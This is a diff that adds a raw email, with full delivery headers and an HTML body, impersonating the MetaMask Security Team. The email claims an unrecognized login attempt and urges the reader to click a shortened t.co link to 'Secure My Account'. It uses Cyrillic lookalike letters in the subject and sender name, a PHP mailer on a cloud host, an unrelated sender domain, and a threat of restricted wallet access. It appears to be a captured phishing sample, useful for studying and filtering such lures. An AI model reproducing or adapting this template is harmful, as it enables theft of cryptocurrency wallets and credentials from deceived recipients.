@@ -1,0 +1,104 @@
+Return-Path: <postmaster@30ed361bc1.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id 4OcqIWDCkWh6cwAAOB6+FQ
+	(envelope-from <postmaster@30ed361bc1.nxcli.io>)
+	for <info@vorteksenerji.com>; Tue, 05 Aug 2025 11:35:44 +0300
+Return-path: <postmaster@30ed361bc1.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Tue, 05 Aug 2025 11:35:44 +0300
+Received: from cloudhost-3931394.us-midwest-1.nxcli.net ([209.87.158.9]:33540)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@30ed361bc1.nxcli.io>)
+	id 1ujD96-000000001Tl-1IsG
+	for info@vorteksenerji.com;
+	Tue, 05 Aug 2025 11:35:44 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=30ed361bc1.nxcli.io;
+  b=OcYvrgQya62FFqxvpZiVEdCpo+8GeVRFtp3k+FFTBXzYo+BdNb+/MlbgMClotE0MIIacHe6kzQZGiLzB7f2ae/0QXsP2ZMt6TRE8f2IfojfS/gcxoKRtB6KzoiRqCpi6hkq1I5Zo9F9sT28MmrP2e5VWBAX9GxGHVPha8I0rF7YhXCULX3OLNGeHet28b20R4TLdRQ5kAj63+iKzkTwbCYyDI3JJ590vqSAUQ9heft24zv1vs8sJfcyNDJ6lAr/vD7QGvtYWTNaEyQHmmJz4juanZg2shPMOzdijn6veA+oqsqSWBd6ivbYMlECAsMfMwqoMmKyOMLh2XG69IKjI5g==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority:List-Unsubscribe;
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=30ed361bc1.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type:list-unsubscribe; s=default; bh=6JhIUT/WYsXYNv+Lh+
+	5bBxqD2Ek=; b=n/u1jywZDpneABaGG8tfDRWWLSUydIOjJ92IujrJHWsbGH3cCO
+	fbYioSMgLD/cZrnNrAAFnPaPQ4TPhPIFY/EBjBh0u5Wt8NEOEzzVFWVHsEo4v+n7
+	peJX8xCB5aIYoX/YagG4yHAKKIdQxWIzsPRZ9i+Mj2TveBTBdpnuMwfxbo/AgINt
+	kbxgyGWsevWMPm6f9QJd2KC3I/Wm0tLuyHQ9eoeZUjo/j7QkIHkICqyk5Y+d+nXf
+	VXg5mx5VssRlSLdRGXio5f2Ef5p9HRmp+udn8iq+EqiIdapQ6YEwUMxUq0yFjnwS
+	1zDILsYL9H6OIR1hslyJz0XnbscBh1bvsBYA==
+Received: (qmail 32644 invoked by uid 10164); 5 Aug 2025 06:46:39 +0000
+Date: 5 Aug 2025 06:46:39 +0000
+Message-ID: <20250805064639.32628.qmail@cloudhost-3931394.us-midwest-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: Sеcurity Аlert — Unrecоgnized Lоgin Attеmpt
+X-PHP-Originating-Script: 10164:raw.php
+From: "MetаMаsk" <n8ln7ubh@kls.io>
+Reply-To: n8ln7ubh@kls.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+List-Unsubscribe: <mailto:unsubscribe@n8ln7ubh@kls.io>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+</head>
+<body style="margin:0; padding:0; background:#f9fafb;">
+  <center style="font-family:Arial, sans-serif; color:#222; padding:20px;">
+
+    <!-- Logo (hosted on a trusted CDN) -->
+    <img
+      src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
+      alt="MetaMask Logo"
+      width="48"
+      style="display:block; margin:0 auto 16px; border:none; outline:none;"
+    />
+
+    <!-- Headline -->
+    <strong style="font-size:18px; color:#f6851b; display:block; margin-bottom:12px;">
+      Security Alert: Unrecognized Login Attempt
+    </strong>
+
+    <!-- Body copy -->
+    <span style="font-size:14px; line-height:1.4; display:block; margin-bottom:16px;">
+      We detected a login attempt to your MetaMask account from a new device or location.<br/>
+      If this was <strong>not you</strong>, your account may be at risk.
+    </span>
+
+    <!-- Call-to-action link as visible text -->
+    <a
+      href="https://t.co/Q8MzgqJQp4?id=5570846973863033513-5373"
+      style="
+        display:inline-block;
+        font-size:14px;
+        font-weight:bold;
+        color:#ffffff;
+        background-color:#f6851b;
+        text-decoration:none;
+        padding:10px 20px;
+        border-radius:4px;
+      "
+    >
+      No, this wasn’t me – Secure My Account
+    </a>
+
+    <!-- Footer copy -->
+    <span style="font-size:12px; color:#666666; display:block; margin:16px 0 0;">
+      Your wallet access may be restricted until you verify this activity.<br/>
+      If you did not request this, please ignore this message.
+    </span>
+
+    <span style="font-size:12px; color:#aaaaaa; display:block; margin-top:8px;">
+      — MetaMask Security Team
+    </span>
+
+  </center>
+</body>
+</html>
+
